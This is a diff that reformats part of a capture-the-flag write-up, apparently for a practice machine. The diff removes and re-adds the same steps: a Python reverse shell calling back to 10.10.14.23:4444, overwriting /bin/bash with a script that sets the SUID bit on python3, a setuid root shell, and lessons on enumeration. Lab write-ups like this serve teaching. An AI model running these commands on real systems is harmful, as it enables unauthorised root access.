@@ -106,55 +106,20 @@ Reviewing <Code content="syswatch.sh" /> reveals the script calls <Code content=
 a payload that sets the SUID bit on <Code content="python3" />, then trigger it
 via <Code content="sudo syswatch.sh" />. However, directly overwriting
 <Code content="/bin/bash" /> fails with <Code content="Text file busy" /> since
-bash is the active shell.
-
-<br />
-
-The fix is to drop the current bash session entirely. A Python reverse shell is used to establish a <Code content="/bin/sh" /> session instead:
-
-<Block
+  bash is the active shell.<br />The fix is to drop the current bash session entirely. A Python reverse shell is used to establish a <Code content="/bin/sh" /> session instead:<Block
   language="Python"
   content={
-    'python3 -c \'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.23",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
+  'python3 -c \'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.23",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
   }
-/>
-
-From this <Code content="sh" /> session, <Code content="/bin/bash" /> is no longer busy and can be overwritten:
-
-<Block
+  />From this <Code content="sh" /> session, <Code content="/bin/bash" /> is no longer busy and can be overwritten:<Block
   language="Bash"
   content={
-    "echo '#!/bin/bash' > /tmp/pwn.sh\necho 'chmod u+s /usr/bin/python3' > /tmp/pwn.sh\nchmod +x /tmp/pwn.sh\ncp /tmp/pwn.sh /bin/bash\nsudo /opt/syswatch/syswatch.sh web"
+  "echo '#!/bin/bash' > /tmp/pwn.sh\necho 'chmod u+s /usr/bin/python3' > /tmp/pwn.sh\nchmod +x /tmp/pwn.sh\ncp /tmp/pwn.sh /bin/bash\nsudo /opt/syswatch/syswatch.sh web"
   }
-/>
-
-<Code content="syswatch.sh" /> runs as root and invokes the now-replaced
-<Code content="/bin/bash" />, which sets the SUID bit on
-<Code content="python3" />. A root shell follows:
-
-<Block
-  language="Python"
-  content={"python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"}
-/>
-
-Root flag retrieved from <Code content="/root/root.txt" />.
-
-<br />
-
-Here are the main takeaways from this machine:
-
-<br />
-
-**SOAP services are worth the effort**: They look intimidating at first but the WSDL hands you the full interface. From now on, I am gonna fetch <Code content="?wsdl" /> immediately.
-
-<br />
-
-**Systemd service files are goldmines**: Credentials passed via command line flags are pretty common. I should always check <Code content="/etc/systemd/system/" /> when doing file reads.
-
-<br />
-
-**Text file busy means drop the process**: I cannot overwrite a binary that is currently in use. Doesn't matter if shell or other application. Pivoting to something different and killing the original is the way to go. In this case, dropping from bash to sh did the trick.
-
-<br />
-
-**World-writable binaries are rare but devastating**: Always run <Code content="ls -la" /> early in enumeration. A world-writable system binary is an instant privesc.
+  />
+  <Code content="syswatch.sh" /> runs as root and invokes the now-replaced
+    <Code content="/bin/bash" />, which sets the SUID bit on
+      <Code content="python3" />. A root shell follows:<Block
+        language="Python"
+        content={"python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"}
+        />Root flag retrieved from <Code content="/root/root.txt" />.<br />Here are the main takeaways from this machine:<br />**SOAP services are worth the effort**: They look intimidating at first but the WSDL hands you the full interface. From now on, I am gonna fetch <Code content="?wsdl" /> immediately.<br />**Systemd service files are goldmines**: Credentials passed via command line flags are pretty common. I should always check <Code content="/etc/systemd/system/" /> when doing file reads.<br />**Text file busy means drop the process**: I cannot overwrite a binary that is currently in use. Doesn't matter if shell or other application. Pivoting to something different and killing the original is the way to go. In this case, dropping from bash to sh did the trick.<br />**World-writable binaries are rare but devastating**: Always run <Code content="ls -la" /> early in enumeration. A world-writable system binary is an instant privesc.
